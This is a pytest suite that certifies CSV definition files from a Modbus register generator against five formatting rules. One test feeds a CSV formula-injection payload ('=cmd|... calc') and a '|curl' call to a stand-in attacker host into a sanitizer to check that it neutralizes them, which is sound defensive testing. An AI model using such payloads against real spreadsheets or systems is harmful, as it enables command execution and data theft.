"""
Apollo-Standard Certification Suite for the 5 Webdyn Pillars.

Certifies full compliance across all definition generation engines, production
governance, and validation pipelines:
  Pillar 1: Encoding: UTF-8 without BOM.
  Pillar 2: End-of-line: CRLF (\\r\\n).
  Pillar 3: Structure: Exactly 11 columns with exact headers.
  Pillar 4: Indexing: Strictly sequential 1..N.
  Pillar 5: Registers: Valid data types (U16, S16, U32, S32, FLOAT32...) and SunPM tags.
"""

from __future__ import annotations

import csv
from pathlib import Path

import pytest

from DefFileGenerator.def_gen import (
    CSVHeaderConfig,
    Generator,
)
from DefFileGenerator.production_governor import verify_file_pillars

# =============================================================================
# Pillar 1: Encoding (UTF-8 without BOM)
# =============================================================================


class TestPillar1EncodingUtf8WithoutBom:
    """Certifies that all definitions and outputs are strictly UTF-8 without BOM."""

    def test_write_output_csv_emits_no_bom(self, tmp_path: Path):
        output_file = tmp_path / "INV_Test_Pillar1.csv"
        rows = [
            {
                "Info1": "3",
                "Info2": "1000",
                "Info3": "U16",
                "Info4": "",
                "Name": "Active Power",
                "Tag": "P_AC",
                "CoefA": "1.0",
                "CoefB": "0.0",
                "Unit": "W",
                "Action": "4",
            }
        ]
        cfg = CSVHeaderConfig(manufacturer="TestMfg", model="TestModel")
        success = Generator.write_output_csv(str(output_file), rows, cfg)
        assert success is True
        raw_bytes = output_file.read_bytes()
        assert not raw_bytes.startswith(b"\xef\xbb\xbf"), "BOM detected in generated file"
        # Must decode cleanly as UTF-8
        decoded = raw_bytes.decode("utf-8")
        assert "TestMfg" in decoded

    def test_verify_file_pillars_rejects_bom(self, tmp_path: Path):
        bom_file = tmp_path / "INV_Test_BOM.csv"
        content = (
            "Modbus;Inverter;Test;Model;;;;;;;\r\n"
            "1;3;1000;U16;;Power;P_AC;1.0;0.0;W;4\r\n"
        )
        bom_file.write_bytes(b"\xef\xbb\xbf" + content.encode("utf-8"))
        is_valid, issues = verify_file_pillars(bom_file)
        assert is_valid is False
        assert any("BOM" in iss for iss in issues)

    def test_verify_file_pillars_rejects_non_utf8(self, tmp_path: Path):
        bad_file = tmp_path / "INV_Test_BadEncoding.csv"
        # 0xFF and 0xFE are invalid UTF-8 byte sequences
        bad_file.write_bytes(b"Modbus;Inverter;\xff\xfe;Model;;;;;;;\r\n")
        is_valid, issues = verify_file_pillars(bad_file)
        assert is_valid is False
        assert any("not valid UTF-8" in iss or "BOM" in iss for iss in issues)


# =============================================================================
# Pillar 2: End-of-Line: CRLF (\r\n)
# =============================================================================


class TestPillar2EndOfLineCrlf:
    """Certifies that generated definition CSV files strictly terminate every line with CRLF."""

    def test_write_output_csv_strict_crlf_terminators(self, tmp_path: Path):
        output_file = tmp_path / "INV_Test_CRLF.csv"
        rows = [
            {
                "Info1": "3",
                "Info2": "1000",
                "Info3": "U16",
                "Info4": "",
                "Name": "Grid Voltage",
                "Tag": "U_AC",
                "CoefA": "0.1",
                "CoefB": "0.0",
                "Unit": "V",
                "Action": "4",
            },
            {
                "Info1": "3",
                "Info2": "1001",
                "Info3": "U16",
                "Info4": "",
                "Name": "Grid Current",
                "Tag": "I_AC",
                "CoefA": "0.01",
                "CoefB": "0.0",
                "Unit": "A",
                "Action": "4",
            },
        ]
        cfg = CSVHeaderConfig(manufacturer="TestMfg", model="ModelCRLF")
        success = Generator.write_output_csv(str(output_file), rows, cfg)
        assert success is True

        raw = output_file.read_bytes()
        # Verify CRLF is present
        assert b"\r\n" in raw, "File does not contain CRLF"
        # Verify no lone LF exists
        segments = raw.split(b"\r\n")
        assert segments[-1] == b"", "File should end with trailing CRLF"
        for idx, seg in enumerate(segments[:-1], start=1):
            assert b"\n" not in seg, f"Line {idx} contains lone LF: {seg!r}"
            assert b"\r" not in seg, f"Line {idx} contains lone CR: {seg!r}"

    def test_multiline_fields_sanitized_to_prevent_line_splitting(self, tmp_path: Path):
        output_file = tmp_path / "INV_Test_MultilineSanitization.csv"
        rows = [
            {
                "Info1": "3",
                "Info2": "1000",
                "Info3": "U16",
                "Info4": "",
                "Name": "Total Active\nPower\r\nMeasurement",
                "Tag": "P_AC",
                "CoefA": "1.0",
                "CoefB": "0.0",
                "Unit": "kW\nHour",
                "Action": "4",
            }
        ]
        cfg = CSVHeaderConfig(manufacturer="TestMfg", model="ModelSanitized")
        Generator.write_output_csv(str(output_file), rows, cfg)

        raw = output_file.read_bytes()
        segments = raw.split(b"\r\n")
        assert segments[-1] == b""
        # Exactly 2 lines: header and 1 register row
        assert len(segments) == 3, f"Expected 2 lines + trailing empty, got {len(segments)}"
        for seg in segments[:-1]:
            assert b"\n" not in seg
            assert b"\r" not in seg

    def test_verify_file_pillars_strict_crlf_mode(self, tmp_path: Path):
        crlf_file = tmp_path / "INV_Test_GoodCRLF.csv"
        crlf_file.write_bytes(
            b"Modbus;Inverter;Test;Model;;;;;;;\r\n"
            b"1;3;1000;U16;;Power;P_AC;1.0;0.0;W;4\r\n"
        )
        is_valid, issues = verify_file_pillars(crlf_file, strict_crlf=True)
        assert is_valid is True
        assert issues == []

        lf_file = tmp_path / "INV_Test_BadLF.csv"
        lf_file.write_bytes(
            b"Modbus;Inverter;Test;Model;;;;;;;\n"
            b"1;3;1000;U16;;Power;P_AC;1.0;0.0;W;4\n"
        )
        is_valid_lf, issues_lf = verify_file_pillars(lf_file, strict_crlf=True)
        assert is_valid_lf is False
        assert any("LF" in iss for iss in issues_lf)


# =============================================================================
# Pillar 3: Structure: Exactly 11 Columns with Exact Headers
# =============================================================================


class TestPillar3StructureElevenColumns:
    """Certifies the 11-column semicolon CSV structure and canonical header metadata."""

    def test_write_output_csv_exact_11_columns_all_rows(self, tmp_path: Path):
        output_file = tmp_path / "INV_Test_Columns.csv"
        rows = [
            {
                "Info1": "3",
                "Info2": "1000",
                "Info3": "U16",
                "Info4": "",
                "Name": "Name1",
                "Tag": "P_AC",
                "CoefA": "1.0",
                "CoefB": "0.0",
                "Unit": "W",
                "Action": "4",
            },
            {
                "Info1": "3",
                "Info2": "1001",
                "Info3": "U32",
                "Info4": "",
                "Name": "Name2",
                "Tag": "E_TOT",
                "CoefA": "1.0",
                "CoefB": "0.0",
                "Unit": "Wh",
                "Action": "4",
            },
        ]
        cfg = CSVHeaderConfig(
            manufacturer="VendorX",
            model="ModelY",
            category="Inverter",
            protocol="Modbus",
        )
        Generator.write_output_csv(str(output_file), rows, cfg)

        with open(output_file, encoding="utf-8") as f:
            reader = csv.reader(f, delimiter=";")
            header = next(reader)
            assert len(header) == 11, f"Header column count {len(header)} != 11"
            assert header[0] == "Modbus"
            assert header[1] == "Inverter"
            assert header[2] == "VendorX"
            assert header[3] == "ModelY"

            for line_idx, row in enumerate(reader, start=2):
                assert len(row) == 11, f"Line {line_idx} column count {len(row)} != 11"

    def test_protocol_normalization_rejects_deprecated(self):
        assert Generator.normalize_protocol("ModbusRTU") == "Modbus"
        assert Generator.normalize_protocol("ModbusTCP") == "Modbus"
        assert Generator.normalize_protocol("modbus_rtu") == "Modbus"
        assert Generator.normalize_protocol("modbus") == "Modbus"

    def test_insufficient_or_excessive_columns_fail_verification(self, tmp_path: Path):
        # 10 columns instead of 11
        file_10 = tmp_path / "INV_Test_10cols.csv"
        file_10.write_text(
            "Modbus;Inverter;Vendor;Model;;;;;;\r\n"
            "1;3;1000;U16;;Power;P_AC;1.0;0.0;W\r\n",
            encoding="utf-8",
        )
        is_valid, issues = verify_file_pillars(file_10)
        assert is_valid is False
        assert any("columns" in iss for iss in issues)

        # 12 columns instead of 11
        file_12 = tmp_path / "INV_Test_12cols.csv"
        file_12.write_text(
            "Modbus;Inverter;Vendor;Model;;;;;;;EXTRA\r\n"
            "1;3;1000;U16;;Power;P_AC;1.0;0.0;W;4;EXTRA\r\n",
            encoding="utf-8",
        )
        is_valid_12, issues_12 = verify_file_pillars(file_12)
        assert is_valid_12 is False
        assert any("columns" in iss for iss in issues_12)


# =============================================================================
# Pillar 4: Indexing: Strictly Sequential 1..N
# =============================================================================


class TestPillar4SequentialIndexing:
    """Certifies strictly sequential 1..N indexing across all generated registers."""

    def test_generated_indexes_are_sequential_1_to_n(self, tmp_path: Path):
        output_file = tmp_path / "INV_Test_Indexing.csv"
        n = 25
        rows = [
            {
                "Info1": "3",
                "Info2": str(1000 + i * 2),
                "Info3": "U16",
                "Info4": "",
                "Name": f"Register_{i}",
                "Tag": f"VAR_{i}",
                "CoefA": "1.0",
                "CoefB": "0.0",
                "Unit": "",
                "Action": "4",
            }
            for i in range(n)
        ]
        Generator.write_output_csv(str(output_file), rows, "TestMfg", "TestMdl")

        with open(output_file, encoding="utf-8") as f:
            reader = csv.reader(f, delimiter=";")
            next(reader)  # Skip header
            indexes = [int(r[0]) for r in reader]
        assert indexes == list(range(1, n + 1))

    def test_index_mismatch_detected_by_governor(self, tmp_path: Path):
        # Index gap: 1, 3 instead of 1, 2
        bad_idx_file = tmp_path / "INV_Test_BadIdx.csv"
        bad_idx_file.write_text(
            "Modbus;Inverter;Test;Model;;;;;;;\r\n"
            "1;3;1000;U16;;P1;P_AC;1.0;0.0;W;4\r\n"
            "3;3;1001;U16;;P2;Q_AC;1.0;0.0;VAr;4\r\n",
            encoding="utf-8",
        )
        is_valid, issues = verify_file_pillars(bad_idx_file)
        assert is_valid is False
        assert any("index mismatch" in iss for iss in issues)


# =============================================================================
# Pillar 5: Registers: Valid Data Types, Word Counts & SunPM Tags
# =============================================================================


class TestPillar5RegistersDataTypesAndTags:
    """Certifies valid data types (U16, S16, U32, S32, FLOAT32...), boundary checks, and SunPM tags."""

    @pytest.mark.parametrize(
        ("raw_type", "expected_normalized"),
        [
            ("U16", "U16"),
            ("uint16", "U16"),
            ("I16", "I16"),
            ("S16", "I16"),
            ("int16", "I16"),
            ("s16", "I16"),
            ("U32", "U32"),
            ("uint32", "U32"),
            ("I32", "I32"),
            ("S32", "I32"),
            ("int32", "I32"),
            ("F32", "F32"),
            ("FLOAT32", "F32"),
            ("float", "F32"),
            ("U64", "U64"),
            ("I64", "I64"),
            ("S64", "I64"),
            ("F64", "F64"),
            ("FLOAT64", "F64"),
            ("BITS", "BITS"),
            ("STRING", "STRING"),
            ("STR20", "STR20"),
            ("IP", "IP"),
            ("MAC", "MAC"),
            ("IPV6", "IPV6"),
            ("RAW", "RAW"),
        ],
    )
    def test_normalize_and_validate_all_recognized_types(
        self, raw_type: str, expected_normalized: str
    ):
        norm = Generator.normalize_type(raw_type)
        assert norm == expected_normalized
        assert Generator.validate_type(raw_type) is True
        assert Generator.validate_type(norm) is True

    @pytest.mark.parametrize(
        "invalid_type",
        ["", "   ", "GARBAGE", "123", "INVALID_TYPE_XYZ", "FOO_BAR_BAZ"],
    )
    def test_invalid_types_rejected(self, invalid_type: str):
        assert Generator.validate_type(invalid_type) is False

    @pytest.mark.parametrize(
        ("dtype", "address", "expected_count"),
        [
            ("U16", "100", 1),
            ("I16", "100", 1),
            ("S16", "100", 1),
            ("U8", "100", 1),
            ("I8", "100", 1),
            ("BITS", "100_0_1", 1),
            ("U32", "100", 2),
            ("I32", "100", 2),
            ("S32", "100", 2),
            ("F32", "100", 2),
            ("FLOAT32", "100", 2),
            ("IP", "100", 2),
            ("MAC", "100", 3),
            ("U64", "100", 4),
            ("I64", "100", 4),
            ("S64", "100", 4),
            ("F64", "100", 4),
            ("FLOAT64", "100", 4),
            ("IPV6", "100", 8),
            ("STR20", "100", 10),
            ("STRING", "100_20", 10),
            ("STRING", "100_11", 6),
            ("STRING", "100_0", 0),
            ("STRING", "100_-5", 0),
            ("RAW", "100_10", 5),
            ("RAW", "100_0", 0),
        ],
    )
    def test_word_count_consistency(self, dtype: str, address: str, expected_count: int):
        assert Generator.get_register_count(dtype, address) == expected_count

    def test_boundary_check_negative_address_strictly_rejected(self):
        assert Generator.validate_address("-1", "U16", strict=True) is False
        assert Generator.validate_address("-1", "U16", strict=False) is False
        assert Generator.validate_address("-100", "U32", strict=True) is False
        assert Generator.validate_address("-100", "U32", strict=False) is False

    def test_boundary_check_16bit_range(self):
        assert Generator.validate_address("0", "U16", strict=True) is True
        assert Generator.validate_address("65535", "U16", strict=True) is True
        assert Generator.validate_address("65536", "U16", strict=True) is False

    def test_boundary_check_address_span_overflow(self):
        # Address 65535 with 32-bit type (2 words) spans 65535-65536 (overflow)
        assert Generator.validate_address("65535", "U32", strict=True) is False
        assert Generator.validate_address("65535", "S32", strict=True) is False
        assert Generator.validate_address("65535", "F32", strict=True) is False
        # Address 65534 with 32-bit type spans 65534-65535 (fits within 16-bit range)
        assert Generator.validate_address("65534", "U32", strict=True) is True

    def test_zero_length_safety_for_strings_and_raw(self):
        assert Generator.validate_address("100_0", "STRING", strict=True) is False
        assert Generator.validate_address("100_-1", "STRING", strict=True) is False
        assert Generator.validate_address("100_0", "RAW", strict=True) is False
        assert Generator.validate_address("100_3", "RAW", strict=True) is False  # Odd byte length
        assert Generator.validate_address("100_4", "RAW", strict=True) is True

    def test_bits_slice_boundaries(self):
        assert Generator.validate_address("100_0_16", "BITS", strict=True) is True
        assert Generator.validate_address("100_0_1", "BITS", strict=True) is True
        assert Generator.validate_address("100_15_1", "BITS", strict=True) is True
        # Exceeds 16 bits
        assert Generator.validate_address("100_15_2", "BITS", strict=True) is False
        assert Generator.validate_address("100_0_17", "BITS", strict=True) is False
        assert Generator.validate_address("100_0_0", "BITS", strict=True) is False
        assert Generator.validate_address("100_-1_4", "BITS", strict=True) is False

    def test_csv_field_sanitization_formula_injection(self):
        assert Generator.sanitize_csv_field("=cmd|' /C calc'!A0").startswith("'=")
        assert Generator.sanitize_csv_field("+12345") == "+12345"  # Valid finite number
        assert Generator.sanitize_csv_field("-12.34") == "-12.34"  # Valid finite number
        assert Generator.sanitize_csv_field("@SUM(1,2)").startswith("'@")
        assert Generator.sanitize_csv_field("|curl http://attacker.com").startswith("'|")
        assert Generator.sanitize_csv_field("%RH") == "%RH"

    def test_csv_field_sanitization_nan_and_infinity(self):
        assert Generator.sanitize_csv_field(float("nan")) == ""
        assert Generator.sanitize_csv_field(float("inf")) == ""
        assert Generator.sanitize_csv_field(float("-inf")) == ""
        assert Generator.sanitize_csv_field("-nan").startswith("'")
        assert Generator.sanitize_csv_field("+inf").startswith("'")
        assert Generator.sanitize_csv_field("=nan").startswith("'")

    def test_sunpm_duplicate_single_instance_tags_detected(self, tmp_path: Path):
        dup_file = tmp_path / "INV_Test_DupTags.csv"
        dup_file.write_text(
            "Modbus;Inverter;Test;Model;;;;;;;\r\n"
            "1;3;1000;U16;;Power1;P_AC;1.0;0.0;W;4\r\n"
            "2;3;1001;U16;;Power2;P_AC;1.0;0.0;W;4\r\n",
            encoding="utf-8",
        )
        is_valid, issues = verify_file_pillars(dup_file)
        assert is_valid is False
        assert any("duplicate" in iss.lower() and "p_ac" in iss.lower() for iss in issues)


# =============================================================================
# Full Pipeline End-to-End Certification
# =============================================================================


class TestFullPipelinePillarsCertification:
    """Verifies complete end-to-end flow from raw inputs to 5-pillars certified CSV."""

    def test_process_rows_to_certified_output_csv(self, tmp_path: Path):
        gen = Generator()
        raw_registers = [
            {
                "Name": "AC Active Power",
                "Tag": "P_AC",
                "RegisterType": "Holding Register",
                "Address": "40001",
                "Type": "FLOAT32",
                "Factor": "1.0",
                "Offset": "0.0",
                "Unit": "kW",
                "Action": "RO",
            },
            {
                "Name": "Total Energy Exported",
                "Tag": "E_TOT",
                "RegisterType": "Holding Register",
                "Address": "40003",
                "Type": "uint32",
                "Factor": "0.1",
                "Offset": "0.0",
                "Unit": "kWh",
                "Action": "4",
            },
            {
                "Name": "Inverter Serial Number",
                "Tag": "SERIAL",
                "RegisterType": "Holding Register",
                "Address": "40005",
                "Type": "string 16",
                "Factor": "1.0",
                "Offset": "0.0",
                "Unit": "",
                "Action": "4",
            },
            {
                "Name": "Grid Frequency",
                "Tag": "FREQ",
                "RegisterType": "Input Register",
                "Address": "30001",
                "Type": "S16",
                "Factor": "0.01",
                "Offset": "0.0",
                "Unit": "Hz",
                "Action": "4",
            },
        ]

        processed = list(gen.process_rows(raw_registers))
        assert len(processed) == 4

        output_file = tmp_path / "INV_AcmeCorp_SolarInverter5000.csv"
        cfg = CSVHeaderConfig(
            protocol="Modbus",
            category="Inverter",
            manufacturer="AcmeCorp",
            model="SolarInverter5000",
        )
        success = Generator.write_output_csv(str(output_file), processed, cfg)
        assert success is True

        # Verify against strict 5 pillars governor
        is_valid, issues = verify_file_pillars(output_file, strict_crlf=True)
        assert is_valid is True, f"Governance issues: {issues}"
        assert issues == []

        # Verify detailed Webdyn validation
        report = gen.validate_csv_detailed(str(output_file), strict=True)
        assert report.is_valid is True
        assert report.register_count == 4
